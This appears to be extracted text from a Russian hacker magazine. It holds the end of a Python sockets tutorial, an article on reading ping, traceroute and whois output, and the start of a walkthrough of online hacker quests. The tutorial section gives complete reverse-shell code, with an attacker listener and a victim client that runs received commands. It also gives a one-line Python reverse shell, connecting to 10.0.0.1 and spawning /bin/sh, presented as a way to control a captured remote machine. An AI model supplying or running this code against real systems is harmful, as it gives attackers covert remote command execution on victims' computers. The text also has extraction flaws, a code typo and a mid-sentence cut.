 В них мы останавливаем прослушивание и освобождаем порт, только если
 сами остановим работу программы. Если прерыва ния не произошло, то
 выпол няется блок else:


 else:
   result = client.recv(1024)
   print('Message:', result.decode('utf‐8'))

 Здесь мы сохраняем пользовательские данные в переменную result, а фун‐
 кцией print() выводим на экран сообщение, которое нам отправлял клиент
 (предварительно превратив байты в стро ку Unicode). В результате сторона
 сервера будет выглядеть примерно так:


 import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind(('127.0.0.1', 8888))
 s.listen(5)
 while 1:
   try:
     client, addr = s.accept()
   except KeyboardInterrupt:
     s.close()
     break
   else:
     result = client.recv(1024)
     print('Message:', result.decode('utf‐8'))


 Сто рона клиента
 Со стороной клиента опять же все обстоит проще. После подключения биб‐
 лиотеки и создания экземпляра клас са s мы, используя метод connect(),
 подклю чаемся к серверу и порту, на котором принимаются сообщения:


 s.connect(('127.0.0.1', 8888))

 Далее мы отправляем пакет данных получа телю методом send():


 s.send(b'<YOUR MESSAGE>')

 В конце останавливаем прослушивание и освобождаем порт:


 s.close()

 Код клиента будет выглядеть примерно так:


 import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('127.0.0.1', 8888))
 s.send(b'<YOUR MESSAGE>')
 s.close()


 Тестиру ем
 Запустим в двух разных консолях код сервера и код клиента. На выходе мы
 должны получить примерно то же самое, что и с протоколом UDP.





                   Вывод на сто роне сервера

 Успех! Поздрав ляю: теперь тебе открыты большие возможности. Как видишь,
 ничего страшного в работе с сетью нет. И конечно, не забываем, что раз мы
 эксперты в ИБ, то можем добавить шифрование в наш протокол.
   В качестве следующего упражнения можешь попробовать, например,
 написать чат на несколько персон, как на скрин шоте.





              Самодельный чат, вид со стороны сервера


 ПРИМЕНЯЕМ ЗНАНИЯ НА ПРАКТИКЕ
 Я дважды участво вал в InnoCTF, и работа с сокета ми в Python очень пригож‐
 дается при решении задач на взлом. По сути, все сводится к тому, чтобы
 очень много раз парсить пос тупа ющие данные с сервера InnoCTF и правиль‐
 но их обрабатывать. Данные могут абсолютно любыми. Обычно это матема‐
 тические примеры, разные уравнения и прочее.
   Для работы с сервером я использую следующий код.


 import socket
 try:
   s = socket.socket(socket.AF_INET, spcket.SOCK_STREAM)
   s.connect(('<HOST>', <PORT>))
   while True:
     data = s.recv(4096)
     if not data:
       continue
     st = data.decode("ascii")
     # Здесь идет алгоритм обработки задачи, результаты работы
 которого должны оказаться в переменной result
     s.send(str(result)+'\n'.encode('utf‐8'))
 finally:
   s.close()

 Здесь мы сохраняем байтовые данные в переменную data, а потом преобра‐
 зуем их из кодировки ASCII в строчке st = data.decode("ascii"). Теперь
 в переменной st у нас хра нится то, что нам прис лал сервер. Отправлять ответ
 мы можем, только подав на вход строковую переменную, поэтому обязатель‐
 но используем функцию str(). В конце у нее символ переноса строки — \n.
 Далее мы все кодируем в UTF‐8 и методом send() отправляем серверу.
 В конце нам обязательно нужно закрыть соеди нение.


 ДЕЛАЕМ ПОЛНОЦЕННЫЙ REVERSE SHELL
 От обучающих примеров переходим  к реальной задаче — раз работке
 обратного шелла, который поз волит выполнять команды на захваченной уда‐
 ленной машине.
   При этом добавить нам нужно толь ко вызов функции subprocess. Что
 это такое? В Python есть модуль subprocess, который поз воляет запускать
 в операционной системе процессы, управлять ими и взаимодействовать
 с ними через стандартный ввод и вывод. В качес тве простейшего примера
 используем subprocess, чтобы запус тить блокнот:


 import subprocess
 subprocess.call('notepad.exe')

 Здесь метод call() вызывает (запускает) ука занную программу.
   Переходим к разработке шелла. В данном случае сторона сервера будет
 атакующей (то есть наш компь ютер), а сторона клиента — атакованной
 машиной. Именно поэтому шелл называется обратным.


 Сто рона клиента (атакован ная машина)
 Вначале все стан дартно: подклю чаем модули, создаем экземпляр клас са
 socket и подключаемся к серверу (к тому, кто атакует):


 import socket
 import subprocess
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('127.0.0.1', 8888))

 Обрати внимание: когда мы указываем IP для подключения, это адрес ата‐
 кующего. То есть в данном случае наш.
   Далее идет основная часть кода, где мы обра баты ваем команды и выпол‐
 няем их.


 while 1:
   command = s.recv(1024).decode()
   if command.lower() == 'exit':
     break
   output = subprocess.getoutput(command)
   s.send(output.encode())
 s.close()

 Вкратце пройдемся по коду. Так как нам в какой‐то момент нужно будет выйти
 из шелла, мы проверяем, не придет ли команда exit, и, если придет, пре‐
 рываем цикл. На случай, если она вдруг будет написана заглавными буквами
 или с заглавной, переводим все символы принятой команды в нижний
 регистр строковым методом lower().
   А теперь самое главное. Метод getoutput() модуля subprocess вызыва‐
 ет исполнение команды и воз вра щает то, что она выдаст. Мы сохраним вывод
 в переменную output.


              INFO

                    Наш буфер ограничен одним килобайтом памяти,
                          чего может не хватить для сохранения больших
                        выводов.  Для  этого  просто  нужно  зарезер‐
                         вировать больше памяти. Например, 4096 байт,
                        а не 1024.


 Далее мы отправляем результат выполнения ата кующему и, если атакующий
 завершил сессию командой exit, закрыва ем соеди нение.
   Весь код будет выглядеть вот так:


 import socket
 import subprocess
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('127.0.0.1', 8888))
 while 1:
   command = s.recv(1024).decode()
   if command.lower() == 'exit':
     break
   output = subprocess.getoutput(command)
   s.send(output.encode())
 s.close()


 Сто рона сервера (атакующего)
 Здесь все начинается абсолютно так же, как и в примерах выше.


 import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind(('0.0.0.0', 8888))
 s.listen(5)

 Единственное изменение — это IP‐адрес. Ука зав одни нули, мы используем
 все IP, которые есть на нашей локальной машине. Если локальных адресов
 несколько, то сервер будет работать на любом из них.
   Далее принимаем подключение и данные: в client будет новое подклю‐
 чение (сокет), а в addr будет лежать адрес отпра вителя:


 client, addr = s.accept()

 Теперь основная часть:


 while 1:
   command = str(input('Enter command:'))
   client.send(command.encode())
   if command.lower() == 'exit':
     break
   result_output = client.recv(1024).decode()
   print(result_output)
 client.close()
 s.close()

 Думаю, тебе уже знаком этот код. Здесь все просто: в переменную command
 мы сохраняем введенную с клавиату ры команду, которую потом отправляем
 на атакуемую машину. И заодно орга низуем себе возможность цивилизован‐
 но выйти, набрав команду exit. Далее сохраняем то, что нам прислала ата‐
 кованная машина, в переменную result_output и выводим ее содержимое
 на экран. После выхода из цикла закрыва ем соединение с клиентом и с
 самим сервером.
   Весь код будет таким:


 import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind(('0.0.0.0', 8888))
 s.listen(5)
 client, addr = s.accept()
 while 1:
   command = str(input('Enter command:'))
   client.send(command.encode())
   if command.lower() == 'exit':
     break
   result_output = client.recv(1024).decode()
   print(result_output)
 client.close()
 s.close()

 Осталось проверить! Запус каем в одной консоли сервер (сторона атакующе‐
 го), а в другой — клиент (ата куемый) и видим вывод в консоли сервера.





                 Вывод на сто роне атакующего

 Попробуем открыть блокнот, написав notepad.exe.





                                Ура, блокнот!

 Поздравляю, твой первый шелл готов!


 ШЕЛЛ ОДНОЙ СТРОЧКОЙ
 Чтобы закинуть код на уда ленную машину, удобно иметь его в виде одной
 строчки. Благо в Python есть все необходимое, чтобы уместить код клиента
 в одну недлинную строку. Вот как она выглядит.


 python ‐c 'import socket,subprocess,os;s=socket.socket(socket.
 AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",8888));os.dup2(s.
 fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subpro
 cess.call(["/bin/sh","‐i"]);'

 Ключ ‐c позволяет передать программу в качес тве параметра.
   Думаю, ты сразу подметил зна комые элемен ты кода. Но для удобства я
 распишу построчно:


 import socket,subprocess,os
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(('10.0.0.1',8888))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 p=subprocess.call(['/bin/sh','‐i']) # Для Windows — .call('cmd.exe')

 Как видишь, появилось кое‐что новень кое: os, dup2(), fileno(). Чтобы
 понять, как это работает, нужно знать, что такое фай ловые дескрипторы.
   Если совсем по‐прос тому, то это некие целые неотрицательные чис ла,
 которые возвращаются процес су после того, как он создаст поток вво‐
 да‐вывода и поток диагностики. В UNIX устоявшиеся названия потоков —
 это 0, 1 и 2. 0 соот ветствует стандартному вводу процес са (терминал), 1 —
 стандартный вывод (терминал), 2 — поток диагностики (файл с сообщениями
 об ошибках).
   Модуль os — это еще один стандартный элемент Python. Он позволя ет
 программе общаться с операционной системой. Входящий в него метод
 dup2() предназначен для того, чтобы менять значения файловых дескрип‐
 торов. fileno() — это метод объекта типа socket, который возвращает фай‐
 ловый дескриптор сокета. А при помощи метода dup2() мы меняем дескрип‐
 торы ввода‐вывода и ошибок на соответству ющие дес крипторы сокета.


 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)

 То есть, считай, мы взяли и сделали наш сокет полноценным процессом. Что
 это нам дает? Мы можем запус тить терминал и использовать его! Для этого
 нужна вот эта строка:


 p=subprocess.call(['/bin/sh','‐i'])

 Для Windows она будет слегка дру гой:


 p=subprocess.call('cmd.exe')

 Вот так вот мы «обхитрили» систему. Точнее, прос то воспользовались одной
 из продвинутых функций.


 В ЗАВЕРШЕНИЕ
 Теперь ты не только зна ешь, как организовать передачу сообщений между
 программами на Python, но и умеешь писать хитрые однострочники, которые
 передают тебе управление уда ленной машиной. Думаю, ты уже ощущаешь
 невероятную мощь и готов к эксперимен там. Желаю удачи с ними!
 АДМИН





    Даниил Батурин
Координатор проекта VyOS
(https://vyos.io), «языковед»,
 функциональщик, иногда
  сетевой администратор
      daniil@baturin.org





 МАЛЕНЬКИЕ СЕКРЕТЫ
СЕТЕВЫХ УТИЛИТ

 ИНТЕРПРЕТИРУЕМ ВЫВОД PING,
 TRACEROUTE И WHOIS
 ДЛЯ ОТЛАДКИ




  Команды ping, traceroute и whois — в числе первых вещей,
  о которых узнают начинающие админы. Многие, кто не спе‐
  циализируется на сетях, ими и огра ничиваются, и совер‐
 шенно зря. С помощью стан дартных инструментов можно
  извлечь гораздо больше информации о проблеме, чем
  может показаться.


  PING
  Команда ping  example.com известна каж дому, даже далекому от сетей
  человеку. Она отправляет удален ному хосту пакеты ICMP echo, на которые,
  по идее, он должен ответить таким же пакетом.
    Однако этот протокол не прос то так называ ется Internet Message Control
   Protocol. Его функции далеко не только диагности чес кие, а диагностические
  функции куда шире, чем «ответил — не ответил».


  Что может сказать ping?
  Зачастую, если хост наз начения недос тижим, от ping дей ствительно можно
  получить только request timeout и ничего больше. Если успешный ответ
  всегда исходит от самого хос та назначения, то сооб щения об ошибках дос‐
  тавки — от промежуточных маршру тиза торов. По стандарту промежуточные
  маршрутизаторы могут, но не обязаны уведомлять отправителя. Часто и не
  уведомляют — по сооб ражениям производитель нос ти, и обви нить их не в
  чем.
    Но уж если тебе пришел ответ от промежу точного маршрутизатора, он
  обычно информативен. К примеру, ответ destination host unreachable
  должен отправляться только тогда, когда хост находится в одной локальной
  сети с маршрутизатором и не отвечает. Самый прос той способ уви деть эту
  ошибку — пингануть заведомо несуществу ющий адрес в своей же сети:
  к примеру, если твоя сеть 192.168.0.0/24 и хос та 192.168.0.200 в ней нет,
  выпол нить ping 192.168.0.200.
     Такой ответ может прийти только от пос леднего маршру тизатора на пути
  к хосту.
    А вот network unreachable говорит об отсутствии маршрута к указанной
  сети у одного из хостов на пути. Эта ошиб ка может возникнуть в любом месте
  пути, поэтому нужно обра тить внимание на отправителя.
    Чаще всего эта проб лема у тебя самого: слетели настрой ки маршрутов
  или хост не получил маршрут от сервера DHCP. Но такой ответ может прийти
  и от промежуточного маршру тиза тора:


  From 192.0.2.100 icmp_seq=1 Destination Net Unreachable

  Если ты видишь такую картину, что‐то серь езно пошло не так. Если хост дос‐
  тижим из других сетей, вполне возможно, что у провайдера проб лема с нас‐
  тройками BGP. Я как минимум один раз сталкивался с тем, что крупный про‐
  вайдер ошибочно фильтровал маршруты из сети, которую он считал зарезер‐
  вированной для исполь зования в будущем, хотя на тот момент IANA уже пол‐
  года как передала ее RIPE NCC и многие люди получили адреса из нее.


         WWW

                        Если не хочешь быть как тот провайдер, можно
                          воспользоваться  авто матически  обновляемыми
                         списками несуществующих адресов вроде Cymru
                        Bogon Reference


  Ошибки семейства destination host/net prohibited означают, что пакет
  был отброшен правилом межсетевого экра на. Впрочем, никто не обя зывает
  отвечать отправителю именно так или вообще отвечать. К примеру, в Linux
  правила вида iptables ‐j REJECT по умолчанию выдают destination port
  unreachable, если явно не указать ‐‐reject‐with, при чем указать можно
  любой тип, даже icmp‐net‐unreachable.
    Но это все о простом ping без опций. Некоторые проблемы лучше все го
  выявляются допол нительными опциями.


  Определяем проб лемы с MTU
  Пользователи VPN нередко могут столкнуться с недоступностью опре делен‐
  ных ресурсов именно через туннель, даже если без туннеля из той же сети
  они прекрасно работают.
     Распространенная причина таких проб лем — некорректно нас троена сеть
  назначения, из‐за чего пакеты перестают проходить через туннель. Поскольку
  MTU (Maximum Transmission Unit — максималь ный размер пакета) для тун‐
  нелей меньше, чем стандартный для интернета размер 1500, правильная
  работа соединений требует работающего path MTU discovery. Увы, работает
  он не всегда, и самый прос той способ его сло мать — запретить протокол
  ICMP, «чтобы не пинговал кто попало».
     Такие патоло гические случаи среди сетевых админов встре чаются редко,
  но именно сломанный PMTU discovery, увы, рас пространен.
    Выявить эту проб лему можно, указав размер пакета опцией ‐s: ping ‐
  s1300  www.example.com.  Если  стандартный  пинг  с  размером  пакета
  в 64 байта проходит, но с какого‐то раз мера пакета (например, ‐s 1450) пинг
  внезапно перестает работать, то поз дравляю, ты нашел проблему. Пиши
  админу, чтобы включил MSS clamping, или включай сам, если ты и есть админ.


 Ищем глу бокую инспек цию пакетов
  Многие решения для DPI не смотрят так уж глубоко, а прос то ищут фик‐
  сированные строки в пакетах. В некоторых случаях определить наличие
  такого DPI на пути можно с помощью одно го ping. В Linux для этого есть
  опция ‐‐pattern. Один недос таток — сомнительную строку при дется вруч‐
  ную кодиро вать в hex, но, если установить генера тор пакетов нет никакой
  возможности, может пригодиться.


  TTL exceeded
  Еще одна ошибка, которую на практике можно уви деть только с дополнитель‐
  ной опцией, — Time to live exceeded. Поле Time To Live у пакетов IPv4
  (Hop Limit в IPv6) ограничено зна чением 255, но интернет — «тесная сеть»,
  и средний путь не достигает и одной десятой максимальной длины. Изна‐
  чальная цель это го механизма — предотвратить бесконечную пересылку
  пакетов по кругу при воз никновении петли маршру тизации, но современные
  протоколы исключают петли. Тем не менее никто не мешает указать TTL
  заведомо короче ожидаемой длины пути:


  $ ping ‐t1 9.9.9.9
  PING 9.9.9.9 (9.9.9.9) 56(84) bytes of data.
  From 10.91.19.1 icmp_seq=1 Time to live exceeded


  TRACEROUTE
  Именно по принципу, описанному выше, и работает команда traceroute:
  отправляет пакеты сначала с TTL = 1, затем TTL = 2 и так далее и ждет отве тов
  TTL exceeded от каждого промежу точного хоста.
    На первый взгляд traceroute представляется таким же простым инс трумен‐
  том, как ping. На самом деле из его вывода тоже можно извлечь больше дан‐
  ных, чем кажется. В то же время там можно увидеть проблему, которой
  не существует в реальности, а реальные проб лемы могут никак не отоб‐
  ражаться.


  Задержки
  Как обычная команда traceroute, так и инс трументы вроде MTR весьма
  популярны для поиска «узких мест» в сети. MTR показывает статистику задер‐
  жек для каждого хоста на пути.
    Однако интерпретация этих данных не так очевидна. Предположим, ты
  видишь на первом хос те задержку в 20 миллисекунд, а на втором — 950.
  Не спеши радоваться, что нашел узкое мес то, и ругать админов той сети.
  Задержки выдачи ICMP TTL exceeded могут не иметь ничего обще го с задер‐
  жками передачи пакетов.
    В нашем сценарии 950 миллисекунд — это именно время, которое прош‐
  ло от отправки пакета до получения ответа ICMP. Сколько ушло времени
  на передачу тестового пакета — неизвес тно. Сколько ушло на доставку отве‐
  та — тоже. Сколько прошло времени между получением пакета и отправкой
  ответа?
     Будет большой ошибкой считать, что это время близ ко к нулю. Во‐первых,
  пересылкой пакетов час то занимается аппаратная фабрика коммутации,
  а для управляющей операционной системы используется весьма скромный
  процессор. Поскольку сообщения ICMP всегда генерируются программно,
  этот процесс гораздо медленнее. Даже для чисто программных решений
  задачи вроде ответов на пинги и отправки TTL exceeded куда менее при ори‐
  тетны, чем маршрутизация.
    Поэтому сам по себе всплеск задержек в выводе traceroute или MTR
  ничего не означает. Вот если все задержки на последу ющих хостах боль‐
  ше 950 миллисекунд, тогда уже есть повод ругать ся с адми нами.


  Асимметрич ные пути, балан сировка, MPLS
  Не меньшей ошибкой будет считать, что трафик всегда возвращается к тебе
  тем же путем, который ты видишь в traceroute. Для транзитных маршрутиза‐
  торов, в отличие от клиентских, асимметричная маршрутизация — явление
  обычное, даже неизбежное.
     Если сеть провайдера A подключена к сетям B и C каналами с одинаковой
  пропускной способ ностью и качеством, будет вполне естественно рас пре‐
  делить исходящий трафик по этим каналам. Однако даже если админы про‐
  вайдера А предпочитают отправлять большую часть трафика через сеть B,
  над входящим трафиком у них нет почти никако го контроля. Можно искусс‐
  твенно «ухудшить» анонсы маршрутов в сети C, но и в этом случае нет гаран‐
  тии, что кли енты сети B проводят ту же политику. Вполне воз можно, что они
  как раз предпочитают сеть C.





  Предположим, что сеть C на самом деле плохая. Увидим ли мы это в tracer‐
  oute? Очевидно, нет, поскольку истечение TTL всегда случается на пря мом
  пути, а не на обратном. Никакого способа увидеть пол ный граф сети
  не существует.
    Еще более интересной ситуацию делает MPLS. Пос кольку кад ры MPLS
  инкапсулируют пакеты IP целиком и для сетей на концах LSP он выглядит
  как прямое физическое соединение, огромная часть внутренней структуры
  транзитной сети оказывается невидимой.
     Эта ситуация делает отладку сложнее не только для пользователей, но и
  для самих провайдеров, поэто му иногда используют MPLS ICMP tunneling,
  который позволяет генерировать корректные ответы. Однако, пос кольку
  отправителем пакетов IP выс тупа ет последний маршру тизатор в логическом
  соединении MPLS (до него никакой обработки IP не делается), это будет выг‐
  лядеть как множество хостов с нулевой задержкой между ними.





  WHOIS
  Предположим, ты нашел проблемную сеть с помощью ping или traceroute
  или увидел адреса зло умышленников в логах. Как теперь найти, с кем ругать‐
  ся? Здесь тебе на помощь придет whois.
    Чаще все го команду  whois используют для  получе ния информации
  о доменах (whois example.com). На самом деле в базах данных RIR (Regional
   Internet Registries — RIPE NCC, ARIN...) существу ет куда больше типов объ‐
  ектов.
    Каждый  выделенный  ресурс,  будь  то  номер  автономной  сис темы
  или адрес сети, имеет в базе данных свою запись, из которой можно узнать
  его принадлежность.
    К примеру, ты хочешь пожало вать ся, что авторы «Хакера» учат молодежь
  плохому. Можно отрезолвить xakep.ru и выполнить whois 178.248.232.27.
  Но ты подозреваешь, что информа ция о самом адресе не совпадает
  с информацией о сети хостера. Не страшно, whois понимает и адреса сетей:



    $ whois 178.248.232.0/24
    [Querying whois.ripe.net]
    [whois.ripe.net]
    ...


    % Information related to '178.248.232.0 ‐ 178.248.239.255'


    % Abuse contact for '178.248.232.0 ‐ 178.248.239.255' is 'abuse@qrator.
    net'


    inetnum:        178.248.232.0 ‐ 178.248.239.255
    netname:        RU‐QRATOR‐20100512
    country:        RU
    org:            ORG‐LA267‐RIPE
    admin‐c:        QL‐RIPE
    tech‐c:         QL‐RIPE
    status:         ALLOCATED PA
    remarks:        QRATOR filtering network


  Здесь нам сразу показывают abuse contact, но, если его вдруг нет, всегда
  можно копать дальше и смот реть whois про любое поле. Например, whois
  ORG‐LA267‐RIPE. По пра вилам, у каж дой орга низа ции есть abuse contact.
    Оттуда же можно извлечь информа цию об автономных сис темах. Просто
  допиши AS перед номером. Например, кому принадлежит автономная сис‐
  тема 6939?



    $ whois AS6939
    [Querying whois.radb.net]
    [whois.radb.net]


    aut‐num:    AS6939
    as‐name:    HURRICANE
    descr:      Hurricane Electric


  Как поступать с людьми, которые шлют тебе спам и брутфорсят твои сер‐
  висы, — решать тебе, но во многих случаях написать письмо хостеру на abuse
  contact не будет лишним. Большинс тву хос теров и провайдеров нарушители
  закона и порядка ни к чему, так что, если у тебя есть доказательства, веро‐
  ятность, что сервер нарушителя заблокиру ют, ненулевая.


  LOOKING GLASS
  Многие провайдеры предос тавляют сервисы  looking  glass, с помощью
  которых можно просмотреть отладочную информацию с их маршрутиза‐
  торов.
    Они доступны через веб‐интерфейс, но иногда и через Telnet/SSH.
     Увы, общего способа его найти не сущес твует, и на сайтах провайдеров
  эти адреса чаще всего не пишут. Тем не менее сам термин настолько стан‐
  дартный, что запрос $provider looking glass в любой поисковой системе при‐
  ведет    тебя    к    цели.   Например,    https://duckduckgo.com/?
  q=rostelecom+looking+glass приводит нас к http://lg.ip.rt.ru.
     Большинство из них позволяют выполнить ping и traceroute, а самые пол‐
  ные предоставляют еще и информа цию о маршрутах BGP и воз можность
  выбора маршрутизаторов из раз ных регионов.


 ЗАКЛЮЧЕНИЕ
  Лю ди постоянно создают новые и полезные инструменты, но начинать
  отладку всегда можно со ста рых, испытанных и присутс твующих в любой сис‐
  теме — их же вполне может оказать ся достаточно.
GEEK
   ИГРЫ
 С НЕВЕДОМЫМ
       КАК УСТРОЕНЫ ХАКЕРСКИЕ КВЕСТЫ
  И ПОЧЕМУ ОТ НИХ ТЯЖЕЛО ОТОРВАТЬСЯ





         expl0iter
    blbxlxjljnln@gmail.com





Любопытство — это ключ  к совершенству. Увлеченный
человек  готов прилагать усилия,  что бы снова и снова
находить ответы и удовлетво рять свою тягу к познанию.
Один из способов задействовать силу любопытства —
это хакерские квесты. Они лежат на пересечении игр в аль‐
тернативную реальность (ARG) и CTF‐соревнований и манят
участников атмосферой тайны, но не только раз вле кают,
но и дают совер шенно реальные навыки.


ЧТО ТАКОЕ ARG?
На случай, если ты еще не слышал про забаву под названием Alternate Reality
Game, вкратце расска жу, что это такое. Представь себе игру, которая
в качестве платформы использует реальный мир. Точнее, даже не игру,
а интерактивное повествование с игровыми элементами.
  Скоординировав усилия (обычно через интернет), участни ки ARG ищут
зацепки и идут по следу выдуманной авторами исто рии. Ключи при этом могут
попадаться как на специально развернутых для это го сайтах, так и в жизни:
например, на плакатах, спря танных флешках, в записях на автоответчик и так
далее.
  Получается  этакая  гигантская  многопользовательская  головоломка,
которая сочетает в себе ролевые и компьютер ные игры, журналистские рас‐
следования, фантастику и мистику.
  Влияние аудитории на исход ARG нас только велико, что сюжет может пой‐
ти по непредвиденному сценарию, завершиться раньше времени или оста‐
новиться на середине.
  Сегодня в развле кательные коммерчес кие про екты играют несколько мил‐
лионов человек по всему миру. Основные движущие силы при решении
ARG — это любопытство, любовь к головоломкам, желание изучать крип‐
тографию и проверить уровень собственной эру диции. Ведь если ты смо‐
жешь дойти до финала, то окажешься одним из немногих счастливчиков.
  Коммерческих ARG мно жество. Среди наиболее нашумевших: I Love Bees,
которая была частью кампании вирус ного маркетинга игры Halo 2, Lost Experi‐
ence и Find 815, которые рекламировали сериал Lost, хорошо извес тная гей‐
мерам головоломка по вселенной Portal и дру гие.
   Ну а к нашей тематике, конечно, ближе всего Cicada 3301 и ARG по сери‐
алу Mr. Robot (мы подробно писали о ней).


В ЧЕМ РАЗНИЦА МЕЖДУ ARG, CTF И КВЕСТАМИ В СТИЛЕ CTF?
Вокруг ARG сфор мировались целые интернет‐сооб щества, и их ряды пос‐
тоянно пополняются. ИБ‐тусовку это веяние тоже затронуло, и здесь слу‐
чилось взаимное опыление с другим популярным жанром — соревнованиями
типа Capture The Flag (подробнее о нем — в статье «CTF. Как взлом стал
спортивным состязанием»). Результат иногда называ ют deepweb puzzle, и по
исполнению они временами ничуть не уступают полноценным ARG.
  От ARG такие квесты отличаются отсутс твием маркетинговой составля‐
ющей, а от CTF — отсутствием четкой орга низа ции. Учас твовать можно в оди‐
ночку или командой любого размера, нет ни призов, ни очков, ни даже даты
завершения.
  Однако отсутствие заранее собранных команд не означает, что нет коман‐
дного решения задач. Чаще всего заинтересованные игроки объ еди няются
в сообщества и помогают друг дру гу со слож ными загадками. Происходит
это на форумах, вики, сабреддитах, имиджбордах и в групповых чатах.
  Например, сабреддит r/ARG посвящен сетевым головоломкам в целом.
Там каждый желающий может поделить ся ссылкой на неизвестный сообщес‐
тву квест, внести свой вклад в решение активных заданий или набраться опы‐
та из уже решенных ARG.
  Вообще  Reddit  в пос леднее время  стал площадкой по умол чанию
для любителей таких активнос тей. Его обитатели зачастую первыми находят
неприметные странички на прос торах даркнета.
   Российское сооб щество исследова телей интернета (нетстал керов) тоже
неоднократно  натыкалось  на  очень оригинальные  квесты,  упоминания
которых не было на Reddit. Зачас тую такие вещи обнаруживаются спон‐
танно — когда кто‐то про чесывает даркнет в поисках новых интересных ссы‐
лок.
   Как только это происхо дит, сообщес тво объединяется для решения най‐
денного куска большой онлайн‐игры. Кста ти, я говорю «найденного куска»,
потому что не всегда можно быть уверенным, окажется ли веб‐страница
началом, серединой или концом игры.


КВЕСТ СОФИИ
Настало время познакомить тебя с некоторыми квестами в стиле CTF,
которые заинтересовали наше сообщество своей сложностью, оригиналь‐
ностью и красотой исполнения. По одному из них пройдемся от начала
до конца, то есть до получения заветного флага. Квест недлинный, но по нему
в целом понятно, с чем приходится стал кивать ся при прохождении. А по
дороге соберем небольшую подборку утилит, которые помогают искать
решение.


Часть 1
Начинается все как обычно — кто‐то находит веб‐страничку. Она принад‐
лежит Sophie, и мимо этого ресурса вряд ли пройдешь не заинтересовав‐
шись.





                        Стартовая стра ница

На главной расположен hex‐код, под ним висит картинка с инь‐ян, в самом
низу страницы — бинарный код, а на фоне играет странная мелодия под наз‐
ванием whiterabbit.
  Первое, что дол жно приходить на ум исследователю подобного рода
ресурсов, — незамедлительно глянуть HTML‐код страницы, не обращая вни‐
мания на то, что, казалось бы, очевидно для глаз. Обычно именно в коде
скрываются либо подсказки, либо бессмысленные комментарии разработ‐
чиков, а иногда и сами ссылки на следующий уровень.
  В нашем случае в консоли раз работчика прячется ссылка на профиль
автора на сайте blackhatworld.





                      Консоль разработчика





                              Blackhat Sophie

Также можно заметить малень кую под сказ ку: Does only webpages have meta
data? Очевидно,  что внимание необходимо будет направить на поиск
метаданных в картинке.





                               Инь‐ян

Что мы и сделаем с помощью ресурса Exif Regex. Получаем EXIF (данные
камеры) и метаданные (XMP). Также для чтения метаданных можно исполь‐
зовать Metadata2go.





                                   EXIF





                         XMP

Теперь мы можем узнать кое‐что об изображении. Например, как на скрин‐
шоте выше. Становится ясно, что соз дателя зовут Sophie, проживает она
в Иркутске, но больше всего удивляет строчка Source из метаданных:
«Комитет государственной безопас ности (КГБ)». Кажется, это намек на слу хи
о том, что спецслужбы используют ARG для вербовки самых способных игро‐
ков.
  Не обращаем на это внимания и перехо дим к расшифровке hex‐кода.
Ищем любой подходящий декодер hex to text и расшифровываем. На выходе
получаем полностью читаемый текст.





                            Decrypt hex to text

Однако до сих пор нам не уда лось найти действительно полезной информа‐
ции. Опытные игроки, которые уже учас твовали в решении квестов, знают, что
у загадки иногда бывают разные решения, некоторые из них нарочно ведут
в тупики. Это как раз такой случай.
  Воспользуемся утилитой DirBuster со спис ком директорий для сервера
Apache. Она перебирает  популярные  наз вания  директорий и файлов
веб‐приложений, пытаясь найти скрытые каталоги и сайты. После сканиро‐
вания обнаруживаем скрытую директорию /server‐status. Заходим в нее
и видим ссылку.





                   Ссылка на следующую часть


Часть 2
На другом ресурсе видим только фото, без каких‐либо объ ясне ний. Вообще
про объяснения в квестах стоит забыть: орга низа торы предпочитают хранить
завесу тайны и лишнего сло ва не про ронят — все ради того, чтобы подогреть
твой интерес. Собственно, обста новка таинственности — это главная при‐
чина, почему такие квесты часто располага ются в .onion.





                   Одна из час тей квес та

Открываем консоль в бра узере, не обна ружи ваем в коде страницы ничего
интересного, поэто му будем работать с фотографией. Скачиваем картинку
с Наполеоном и смотрим в тексто вом представлении (можно в hex‐редакторе
или обычном блокноте). Сразу видим в самом низу документа несколько тек‐
стовых строчек.





                      Картинка в виде текста

Ключ — recital. Поскрипев моз гами, понимаем, что — это кусок ссыл ки.
Пробуем подставить в качестве наз вания фай ла .html и получаем рабочую
ссылку на следующий этап.


Часть 3
На последней странице про екта расположились часы и непонятный шифр.





                             Time to hack

Что с ним делать? Смотреть внимательно в код. Видим, что часы кликабель‐
ны, и получаем еще одну подсказку.





                         Подсказ ка

Сразу сопоставляем две картинки и получа ем конечный шифр: LQCRJGLNPG.





                Сопос тавляем два изоб ражения

Для получения конеч ного результата загоняем шифр в  утилиту dCode
и методом замен получа ем конечный ответ: wonderland.
   Этот квест давно пройден и завершен, но сай ты все еще активны. Ходят
слухи, что квест был создан ради пиара форума BlackHatWorld.


                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ

 ИГРЫ С НЕВЕДОМЫМ
                  КАК УСТРОЕНЫ ХАКЕРСКИЕ КВЕСТЫ
            И ПОЧЕМУ ОТ НИХ ТЯЖЕЛО ОТОРВАТЬСЯ





ПОДОЗРИТЕЛЬНЫЙ FTP И СТЕГАНОГРАФИЯ
Однажды, исследуя закоулки Onion, я нат кнулся на FTP‐сервер, на котором
лежал WAV‐файл. Меня, как любителя квестов, это заинтриговало, и я принял‐
ся искать скрытую информацию.





                     Совсем одинокий WAV

Так я и познакомился с редактором Audacity. Открываем файл в нем и смот‐
рим на спектрограмму.





             Спек трог рамма это го WAV‐файла из Audacity

На скриншоте выше видно, что в фай ле скрыты непонятные символы: USI.
Честно говоря, я до сих пор не знаю, что они зна чат, хотя натыкал ся на них
еще несколько раз.
  К примеру, 1 декабря в Tor был найден еще один похожий FTP‐сервер,
на котором также лежали три картинки.





Сами файлы внешне представляют собой нечто необычное: на всех трех кар‐
тинках на фоне видно цифры 1999, на одном из таких изображений отчетливо
